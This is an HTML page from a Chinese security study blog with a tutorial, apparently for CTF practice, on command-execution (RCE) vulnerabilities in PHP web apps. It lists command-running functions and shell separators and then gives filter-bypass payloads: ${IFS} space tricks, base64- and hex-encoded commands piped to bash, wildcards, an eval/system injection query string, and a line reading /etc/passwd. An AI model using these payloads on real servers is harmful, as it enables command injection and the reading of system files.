@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>四十三，命令执行漏洞 | Hexo</title>
+  <meta name="description" content="一、什么是命令执行命令执行（Remote Command Execution, RCE） Web应用的脚本代码在执行命令的时候过滤不严 从而注入一段攻击者能够控制的代码,在服务器上以Web服务的后台权限远程执行恶意指令 成因 代码层过滤不严 系统的漏洞造成命令注入 调用的第三方组件存在代码执行漏洞常见的命令执行函数 PHP：exec、shell_exec、system、passthru、popen">
+<meta property="og:type" content="article">
+<meta property="og:title" content="四十三，命令执行漏洞">
+<meta property="og:url" content="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="baiQstar的博客">
+<meta property="og:description" content="一、什么是命令执行命令执行（Remote Command Execution, RCE） Web应用的脚本代码在执行命令的时候过滤不严 从而注入一段攻击者能够控制的代码,在服务器上以Web服务的后台权限远程执行恶意指令 成因 代码层过滤不严 系统的漏洞造成命令注入 调用的第三方组件存在代码执行漏洞常见的命令执行函数 PHP：exec、shell_exec、system、passthru、popen">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-01-20T12:25:59.000Z">
+<meta property="article:modified_time" content="2024-01-20T12:26:33.343Z">
+<meta property="article:author" content="白易安">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="baiQstar的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/baiQstar" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">白易安</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">往事如叶，飘散随风</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="title">四十三，命令执行漏洞</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:25:59.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%BA%8C%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" class="title">四十二，XSS跨站脚本攻击</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:24:40.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%80%EF%BC%8CHackademic-RTB1%E9%9D%B6%E6%9C%BA/" class="title">四十一，Hackademic.RTB1靶机</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:23:04.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%EF%BC%8CWireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" class="title">四十，Wireshark抓包分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:21:37.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E4%B8%89%E5%8D%81%E4%B9%9D%EF%BC%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA/" class="title">三十九，目录扫描靶机</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:12:53.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-四十三，命令执行漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      四十三，命令执行漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2024-01-20T12:25:59.000Z" itemprop="datePublished">2024-01-20</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2><span id="一-什么是命令执行">一、什么是命令执行</span></h2><p><strong>命令执行</strong>（Remote Command Execution, RCE）</p>
+<p><strong>Web应用</strong>的脚本代码在<strong>执行命令</strong>的时候<strong>过滤不严</strong></p>
+<p>从而注入一段<strong>攻击者能够控制</strong>的代码,在<strong>服务器</strong>上以Web服务的<strong>后台权限远程执行恶意指令</strong></p>
+<h5><span id="成因"><strong>成因</strong></span></h5><ul>
+<li>代码层过滤不严</li>
+<li>系统的漏洞造成命令注入</li>
+<li>调用的第三方组件存在代码执行漏洞常见的命令执行函数<ul>
+<li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li>
+<li>ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</li>
+<li>Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</li>
+</ul>
+</li>
+</ul>
+<h2><span id="二-常用命令执行函数">二、常用命令执行函数</span></h2><h3><span id="1system"><strong>1）system</strong></span></h3><p>该函数会把执行<strong>结果输出</strong> 并把输出结果的最后一行作为字符串返回 ，如果执行失败则返回false 这个也最为常用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>二次注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac%20f??g.p?p&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>看源码</p>
+<p>看UA头</p>
+<p>robots.txt</p>
+<p>扫目录</p>
+<h3><span id="2exec"><strong>2）exec</strong></span></h3><p><strong>不输出结果</strong>,返回执行结果的最后一行 ，需要使用<strong>echo</strong>进行输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="3passthru">3）passthru</span></h3><p>此函数只调用命令，并把运行结果原样地直接输出，没有返回值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="4shell_exec">4）shell_exec</span></h3><p>不输出结果，返回执行结果 ，使用<strong>反引号(&#96;&#96;)<strong>时调用的就是此函数，需要使用</strong>echo</strong>进行输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="三-命令连接符">三、命令连接符</span></h2><p>Windows和Linux都支持的命令连接符：</p>
+<ul>
+<li><code>cmd1 | cmd2</code> 只执行cmd2</li>
+<li><code>cmd1 || cmd2</code> 只有当cmd1执行失败后，cmd2才被执行</li>
+<li><code>cmd1 &amp; cmd2</code> 先执行cmd1，不管是否成功，都会执行cmd2</li>
+<li><code>cmd1 &amp;&amp; cmd2</code> 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2 Linux还支持分号<code>;</code></li>
+<li><code>cmd1 ; cmd2</code> 按顺序依次执行，先执行cmd1再执行cmd2</li>
+</ul>
+<h2><span id="四-绕过姿势">四、绕过姿势</span></h2><h3><span id="1-常见分隔符"><strong>1、常见分隔符</strong></span></h3><ul>
+<li>换行符 <code>%0a</code></li>
+<li>回车符 <code>%0d</code></li>
+<li>连续指令 <code>；</code></li>
+<li>后台进程 <code>&amp;</code></li>
+<li>管道符 <code>|</code></li>
+<li>逻辑 <code>||</code>、<code>&amp;&amp;</code></li>
+</ul>
+<h3><span id="2-空格绕过"><strong>2、空格绕过</strong></span></h3><p>可以用以下字符代替空格</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">$&#123;&lt;!-- --&gt;<span class="variable constant_">IFS</span>&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过空格的方法大概有以下几种：</p>
+<ul>
+<li>$IFS   ${IFS}   $IFS$9   &#x2F;&#x2F;$1改成$加其他数字貌似都行， {cat,flag.php} 用逗号实现了空格功能</li>
+</ul>
+<p>**ps:**有时会禁用cat: 解决方法是使用tac反向输出命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="3-变量绕过">3、变量绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload 1：    a=ag.php;b=fl;cat$IFS$1$b$a        //cat flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="3-内联执行绕过">3、内联执行绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload 2： cat$IFS$1`ls`               //cat ls</span><br></pre></td></tr></table></figure>
+
+<p>使用内联执行会将 &#96;&#96;内的输出作为前面命令的输入，当我们输入上述payload时，等同于cat falg.php;cat index.php</p>
+<h3><span id="4-编码绕过">4、编码绕过</span></h3><p><strong>base64：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo YWJjZGU=|base64 -d //打印出来abcde</span><br><span class="line">echo Y2F0IGZhbGcucGhw|base64 -d|bash //cat flag.php </span><br><span class="line">echo Y2F0IGZhbGcucGhw|base64 -d|sh //cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>hex：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 63617420666c61672e706870 | xxd -r -p|bash //cat flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="5-通配符绕过">5、通配符绕过</span></h3><p>？？？在linux里面可以进行代替字母</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="6-转义拼接">6、转义拼接</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\c\a\t /etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="7-单引号和双引号">7、单引号和双引号</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at 1.tx&#x27;&#x27;t</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="四十三，命令执行漏洞" target="_blank" rel="external">http://example.com/2024/01/20/四十三，命令执行漏洞/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/baiQstar" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/baiQstar" target="_blank"><span class="text-dark">白易安</span><small class="ml-1x">往事如叶，飘散随风</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%BA%8C%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="四十二，XSS跨站脚本攻击"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
